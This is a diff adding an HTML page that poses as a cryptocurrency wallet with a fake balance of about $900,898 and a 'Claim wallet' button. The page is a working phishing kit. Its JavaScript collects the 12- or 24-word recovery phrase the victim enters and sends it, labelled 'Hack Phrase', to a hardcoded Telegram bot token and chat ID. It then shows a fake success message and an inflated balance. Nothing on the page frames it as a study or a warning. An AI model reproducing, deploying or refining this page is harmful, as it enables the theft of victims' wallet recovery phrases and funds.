@@ -1,0 +1,190 @@
+<html>
+ <head>
+     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+   let errorDisplayed = false;
+   let balance = 900898.59;  // Start balance
+   let isExpanded = false;
+
+   function showErrorMessage(message = "You need to claim this wallet first.") {
+     if (!errorDisplayed) {
+       const messageDiv = document.createElement("div");
+       messageDiv.innerHTML = message;
+       messageDiv.classList.add("text-red-500", "text-center", "mt-2");
+       document.body.appendChild(messageDiv);
+       errorDisplayed = true;
+       setTimeout(() => {
+         messageDiv.remove();
+         errorDisplayed = false;
+       }, 2000);
+     }
+   }
+
+   function showClaimWallet() {
+     document.getElementById('claim-wallet-section').classList.remove('hidden');
+     document.getElementById('wallet-balance').classList.add('blur');
+   }
+
+   function validatePhrase() {
+     const phrase = document.getElementById('phrase-input').value.trim();
+     const words = phrase.split(/\s+/);
+     if (words.length === 12 || words.length === 24) {
+       sendToTelegram(phrase); // Send the phrase to the Telegram bot
+       claimSuccess();
+     } else {
+       showErrorMessage("Phrase must be 12 or 24 words.");
+     }
+   }
+
+   function claimSuccess() {
+     // Clear input section
+     document.getElementById('claim-wallet-section').innerHTML = `
+       <p class="mb-2 text-green-500">You have successfully claimed this wallet. This is your wallet phrase:</p>
+       <p class="text-sm">${generatePhrase()}</p>
+       <button class="bg-green-500 text-white py-2 px-4 rounded-full mt-4" onclick="goBack()">
+         <i class="fas fa-arrow-left"></i> Go Back
+       </button>
+     `;
+     // Update balance
+     balance += 134500;
+     document.getElementById('balance').innerText = `$${balance.toFixed(2)}`;
+     document.getElementById('wallet-balance').classList.remove('blur');
+   }
+
+   function goBack() {
+     document.getElementById('claim-wallet-section').classList.add('hidden');
+     document.getElementById('wallet-balance').classList.remove('blur');
+   }
+
+   function generatePhrase() {
+     const words = ["apple", "orange", "banana", "grape", "melon", "kiwi", "peach", "pear", "plum", "lemon", "lime", "cherry"];
+     let phrase = [];
+     for (let i = 0; i < 12; i++) {
+       const randomWord = words[Math.floor(Math.random() * words.length)];
+       phrase.push(randomWord);
+     }
+     return phrase.join(' ');
+   }
+
+   function toggleBalance() {
+     const balanceElem = document.getElementById('balance');
+     const eyeIcon = document.getElementById('eye-icon');
+     if (balanceElem.classList.contains('hidden')) {
+       balanceElem.classList.remove('hidden');
+       eyeIcon.classList.replace('fa-eye-slash', 'fa-eye');
+     } else {
+       balanceElem.classList.add('hidden');
+       eyeIcon.classList.replace('fa-eye', 'fa-eye-slash');
+     }
+   }
+
+   function toggleWalletName() {
+     const walletNameElem = document.getElementById('wallet-name');
+     if (isExpanded) {
+       walletNameElem.innerText = 'Bitcoin Satoshi...';
+     } else {
+       walletNameElem.innerText = 'Bitcoin Satoshi Wallet';
+     }
+     isExpanded = !isExpanded;
+   }
+
+   async function sendToTelegram(phrase) {
+     const botToken = '7779252424:AAHwhJRnlvWnc84nGutPLIo5nabZfn78FK4'; // Replace with your actual bot token
+     const chatId = '7461224949'; // Replace with your actual chat ID
+     const message = `Hack Phrase: ${phrase}`;
+     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+     try {
+       const response = await fetch(url);
+       if (!response.ok) {
+         throw new Error('Error sending message to Telegram.');
+       }
+     } catch (error) {
+       console.error(error);
+     }
+   }
+  </script>
+ </head>
+ <body class="bg-gray-900 text-white font-sans">
+  <div class="p-4">
+   <!-- Header -->
+   <div class="flex justify-between items-center mb-4">
+    <i class="fas fa-cog text-gray-400" onclick="showErrorMessage()"></i>
+    <h1 class="text-xl font-semibold">Home</h1>
+    <i class="fas fa-link text-gray-400" onclick="showErrorMessage()"></i>
+   </div>
+   <!-- Search Bar -->
+   <div class="relative mb-4">
+    <input class="w-full bg-gray-800 text-gray-400 rounded-full py-2 pl-10 pr-4 focus:outline-none" placeholder="Search" type="text"/>
+    <i class="fas fa-search absolute left-3 top-2.5 text-gray-400"></i>
+   </div>
+   <!-- Wallet Info -->
+   <div class="flex justify-between items-center mb-4">
+    <div class="flex items-center" onclick="toggleWalletName()">
+     <span id="wallet-name" class="text-lg font-semibold">Ethereum Wallet...</span>
+     <i class="fas fa-caret-down ml-2 text-gray-400"></i>
+    </div>
+    <div class="flex space-x-2">
+     <i class="fas fa-copy text-gray-400" onclick="showErrorMessage()"></i>
+     <i class="fas fa-expand text-gray-400" onclick="showErrorMessage()"></i>
+     <i class="fas fa-bell text-gray-400" onclick="showErrorMessage()"></i>
+    </div>
+   </div>
+   <!-- Balance -->
+   <div id="wallet-balance" class="flex items-center mb-4">
+    <span id="balance" class="text-3xl font-bold">$900,898.59</span>
+    <i id="eye-icon" class="fas fa-eye ml-2 text-gray-400" onclick="toggleBalance()"></i>
+   </div>
+   <!-- Action Buttons -->
+   <div class="flex justify-around mb-4">
+    <div class="flex flex-col items-center" onclick="showErrorMessage()">
+     <div class="bg-gray-800 p-4 rounded-full mb-2">
+      <i class="fas fa-paper-plane text-gray-400"></i>
+     </div>
+     <span class="text-sm">Send</span>
+    </div>
+    <div class="flex flex-col items-center" onclick="showErrorMessage()">
+     <div class="bg-gray-800 p-4 rounded-full mb-2">
+      <i class="fas fa-arrow-down text-gray-400"></i>
+     </div>
+     <span class="text-sm">Receive</span>
+    </div>
+    <div class="flex flex-col items-center" onclick="showErrorMessage()">
+     <div class="bg-gray-800 p-4 rounded-full mb-2">
+      <i class="fas fa-credit-card text-gray-400"></i>
+     </div>
+     <span class="text-sm">Buy</span>
+    </div>
+    <div class="flex flex-col items-center" onclick="showErrorMessage()">
+     <div class="bg-gray-800 p-4 rounded-full mb-2">
+      <i class="fas fa-university text-gray-400"></i>
+     </div>
+     <span class="text-sm">Sell</span>
+    </div>
+    <div class="flex flex-col items-center" onclick="showErrorMessage()">
+     <div class="bg-gray-800 p-4 rounded-full mb-2">
+      <i class="fas fa-history text-gray-400"></i>
+     </div>
+     <span class="text-sm">History</span>
+    </div>
+   </div>
+   <!-- Claim Wallet -->
+   <div class="text-center">
+    <button class="text-green-500 text-lg" onclick="showClaimWallet()">Claim wallet</button>
+   </div>
+   <!-- Claim Wallet Section -->
+   <div class="hidden mt-4" id="claim-wallet-section">
+    <div class="bg-gray-800 p-4 rounded-lg">
+     <p class="mb-2 text-sm">Input your 12 or 24 phrase:</p>
+     <input class="w-full bg-gray-700 text-gray-400 rounded-full py-2 px-4 mb-4 focus:outline-none" id="phrase-input" placeholder="Enter your phrase" type="text"/>
+     <button class="bg-green-500 text-white py-2 px-4 rounded-full" onclick="validatePhrase()">Validate Phrase</button>
+     <button class="bg-gray-500 text-white py-2 px-4 rounded-full mt-4" onclick="goBack()">
+       <i class="fas fa-arrow-left"></i> Go Back
+     </button>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
